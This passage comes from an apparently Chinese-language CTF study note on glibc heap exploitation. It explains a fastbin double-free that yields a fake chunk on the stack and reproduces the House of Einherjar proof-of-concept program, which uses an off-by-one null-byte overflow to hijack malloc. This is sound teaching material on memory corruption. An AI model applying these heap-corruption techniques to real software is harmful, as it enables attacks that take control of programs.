/></p>\n<p>此时还可以发现 fastbin 中 fake_chunk 指向了 chunk a 的 fd 处，但是这时可以通过下面发现 <code>0x555555759018</code>  的地方为 0，修改的话也可以作为一个 chunk 来使用</p>\n<h3 id=\"10执行50行malloc8\"><a class=\"anchor\" href=\"#10执行50行malloc8\">#</a> 10. 执行 50 行 <code>malloc(8)</code></h3>\n<p>这时会将 chunk a 申请出去，然后 fastbin 指向 fake_chunk</p>\n<p>可以看到 abc 三个 chunk 都已经不在 fastbin 中了，fasstbin 指向了 fake_chunk</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/LL%5DNTD%7B%5BFMGYT%5B%5B%7BB%5BQWII3.png\" alt=\"\" /></p>\n<h3 id=\"11执行51行malloc8\"><a class=\"anchor\" href=\"#11执行51行malloc8\">#</a> 11. 执行 51 行 <code>malloc(8)</code></h3>\n<p>这时就会将我们伪造出来的 fake_chunk 申请出来，可以通过程序的读写功能进行修改，这里的 fake_chunk 是在栈上，也就是说我们其实通过这种方式最终将栈空间申请了出来进行改写</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/R%7BNHL%7DIH%29I%24C6U3ZZMQ68BU.png\" alt=\"\" /></p>\n<p>此时我们就得到了一个伪造在栈空间的 <code>chunk</code></p>\n<h3 id=\"12程序运行结果\"><a class=\"anchor\" href=\"#12程序运行结果\">#</a> 12. 程序运行结果</h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/IJ17PBK%25%5DUN94D%29NN%25MT5FD.png\" alt=\"\" /></p>\n<p>发现了通过这种 double free 就可以申请一个栈空间来进行改写，只不过需要在栈上先伪造一个 size 位符合大小，才能用这种方式</p>\n<h1 id=\"4house_of_einherjaroff-by-one利用可进行向后合并\"><a class=\"anchor\" href=\"#4house_of_einherjaroff-by-one利用可进行向后合并\">#</a> 4. <code>house_of_einherjar</code> （off by one 利用，可进行向后合并）</h1>\n<p>利用了 <code>off by one </code> 漏洞<s>不仅可以修改下一个堆块的  <code>prev_size</code> </s>，还可以修改下一个堆块的 PREV_INUSE 比特位，通过这个方式可以进行向后合并操作（需要绕过 unlink 检测），通过这个将我们构造的任意地方的 fake_chunk 申请回来进行利用</p>\n<p>free 函数 (向后合并，4002 行)【向后合并其实是低地址的早就是空闲的 chunk 与高地址的 chunk 合并，p 指针指向低地址】：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* consolidate backward */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 检测 p 位是否为 0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            prevsize <span class=\"token operator\">=</span> <span class=\"token function\">prev_size</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 这里会触发 unlink</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* consolidate forward , 本例子没有用到，只是对比一下区别，这里直接吞并高地址 */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>nextinuse<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> nextchunk<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tsize <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">clear_inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"1程序源码-2\"><a class=\"anchor\" href=\"#1程序源码-2\">#</a> 1. 程序源码</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;malloc.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   Credit to st4g3r for publishing this technique</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to House of Einherjar!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Tested in Ubuntu 16.04 64bit.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span> d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nWe allocate 0x38 bytes for 'a'\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\ta <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a: %p\\n\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token keyword\">int</span> real_a_size <span class=\"token operator\">=</span> <span class=\"token function\">malloc_usable_size</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\\n\"</span><span class=\"token punctuation\">,</span> real_a_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token comment\">// create a fake chunk</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"However, you can also create the chunk in the heap or the bss, as long as you know its address\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(although we could do the unsafe unlink technique here in some scenarios)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token class-name\">size_t</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// size of the chunk just needs to be small enough to stay in the small bin</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">// fwd</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">// bck</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">//fwd_nextsize</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span> fake_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">//bck_nextsize</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Our fake chunk at %p looks like:\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prev_size (not used): %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fwd: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bck: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fwd_nextsize: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bck_nextsize: %#lx\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token comment\">/* In this case it is easier if the chunk size attribute has a least significant byte with</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t * a value of 0x00. The least significant byte of this will be 0x00, because the size of </pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t * the chunk includes the amount requested plus some amount required for the metadata. */</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tb <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 没有满足对其</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t<span class=\"token keyword\">int</span> real_b_size <span class=\"token operator\">=</span> <span class=\"token function\">malloc_usable_size</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 这里是 0x100，自动对齐</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nWe allocate 0xf8 bytes for 'b'.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b: %p\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t<span class=\"token class-name\">uint64_t</span><span class=\"token operator\">*</span> b_size_ptr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint64_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t<span class=\"token comment\">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nb.size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b_size_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b.size is: (0x100) | prev_inuse = 0x101\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"We overflow 'a' with a single null byte into the metadata of 'b'\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\ta<span class=\"token punctuation\">[</span>real_a_size<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b.size: %#lx\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>b_size_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This is easiest if b.size is a multiple of 0x100 so you \"</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t\t   <span class=\"token string\">\"don't change the size of b, only its prev_inuse bit\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"If it had been modified, we would need a fake chunk inside \"</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t\t   <span class=\"token string\">\"b where it will try to consolidate the next chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t<span class=\"token comment\">// Write a fake prev_size to the end of a</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nWe write a fake prev_size to the last %lu bytes of a so that \"</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t   <span class=\"token string\">\"it will consolidate with our fake chunk\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token class-name\">size_t</span> fake_size <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>b<span class=\"token operator\">-</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Our fake prev_size will be %p - %p = %#lx\\n\"</span><span class=\"token punctuation\">,</span> b<span class=\"token operator\">-</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">,</span> fake_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">[</span>real_a_size<span class=\"token operator\">-</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fake_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token comment\">//Change the fake chunk's size to reflect b's new prev_size</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nModify fake chunk's size to reflect b's new prev_size\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\tfake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fake_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t<span class=\"token comment\">// free b and it will consolidate with our fake chunk</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n\"</span><span class=\"token punctuation\">,</span> fake_chunk<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t<span class=\"token comment\">//if we allocate another chunk before we free b we will need to </span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t<span class=\"token comment\">//do two things: </span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t<span class=\"token comment\">//1) We will need to adjust the size of our fake chunk so that</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t<span class=\"token comment\">//fake_chunk + fake_chunk's size points to an area we control</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t<span class=\"token comment\">//2) we will need to write the size of our fake chunk</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t<span class=\"token comment\">//at the location we control. </span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t<span class=\"token comment\">//After doing these two things, when unlink gets called, our fake chunk will</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t<span class=\"token comment\">//pass the size(P) == prev_size(next_chunk(P)) test. </span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t<span class=\"token comment\">//otherwise we need to make sure that our fake chunk is up against the</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t<span class=\"token comment\">//wilderness</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nNow we can call malloc() and it will begin in our fake chunk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\td <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Next malloc(0x200) is at %p\\n\"</span><span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>typedef 定义的类型 (本质上是一个 char 类型)</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span>           <span class=\"token class-name\">uint8_t</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>（当一个 chunk 在使用的时候，它的下一个 chunk 的 